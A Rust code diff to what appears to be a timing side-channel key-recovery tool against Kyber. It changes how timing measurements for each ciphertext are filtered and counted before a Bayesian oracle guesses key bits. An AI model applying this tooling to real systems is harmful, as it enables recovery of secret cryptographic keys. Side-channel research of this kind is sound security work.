@@ -77,16 +77,11 @@ fn log_sum_exp(a: f64, b: f64) -> f64 {
 }
 
 /// posterior P(class = 0 | measurements) with uniform prior
-fn posterior_p0(times: &[u64]) -> (f64, usize) {
+fn posterior_p0(times: &[u64]) -> f64 {
     let mut log_lik_0 = 0.0;
     let mut log_lik_1 = 0.0;
-    let mut skipped = 0usize;
 
     for &t in times {
-        if !(T_MIN..=T_MAX).contains(&t) {
-            skipped += 1;
-            continue;
-        }
         let t = t as f64;
         log_lik_0 += log_pdf(t, MU_0, SIGMA_0);
         log_lik_1 += log_pdf(t, MU_1, SIGMA_1);
@@ -94,7 +89,7 @@ fn posterior_p0(times: &[u64]) -> (f64, usize) {
 
     // posterior with equal priors
     let log_den   = log_sum_exp(log_lik_0, log_lik_1);
-    ((log_lik_0 - log_den).exp(), skipped)
+    (log_lik_0 - log_den).exp()
 }
 
 fn kyber_hacker(
@@ -539,8 +534,11 @@ fn kyber_hacker(
         write!(ct_received, "\n").unwrap();
         ct_idx += 1;
 
-        let mut times_to_load_test_ptr_atk = vec![];
-        for _ in 0..ct_repetitions {
+        let mut times_to_load_test_ptr_atk = Vec::with_capacity(ct_repetitions);
+        let mut measurements_for_this_ct: u32 = 0;
+        while times_to_load_test_ptr_atk.len() < ct_repetitions {
+            measurements_for_this_ct += 1;
+
             msg_data[0] = !(__trash & MSB_MASK) as u8;
             stream.write_all(&msg_data).unwrap();
 
@@ -579,7 +577,9 @@ fn kyber_hacker(
             __trash = test_time | (__trash & MSB_MASK);
 
             // store result
-            times_to_load_test_ptr_atk.push(test_time);
+            if (T_MIN..=T_MAX).contains(&test_time) {
+                times_to_load_test_ptr_atk.push(test_time);
+            }
 
             // Dumpy iteration to clean
             msg_data[0] = !(__trash & MSB_MASK) as u8;
@@ -588,11 +588,13 @@ fn kyber_hacker(
             stream.write_all(&ct_rand).unwrap();
             stream.read_exact(&mut msg_data).unwrap();
         }
-        total_calls += ct_repetitions;
-
-        let (p0, skipped) = posterior_p0(&times_to_load_test_ptr_atk);
+        total_calls += measurements_for_this_ct;
+        let skipped = measurements_for_this_ct - ct_repetitions;
         total_skipped_calls += skipped;
+
+        let p0 = posterior_p0(&times_to_load_test_ptr_atk);
         oracle_stream.write_all(&p0.to_be_bytes()).unwrap();
+        oracle_stream.write_all(&measurements_for_this_ct.to_be_bytes()).unwrap();
     }
     println!("Key recovery took {} measurements, filtered out {} of them; total used = {}", total_calls, total_skipped_calls, total_calls - total_skipped_calls);
     threshold_v.clear();
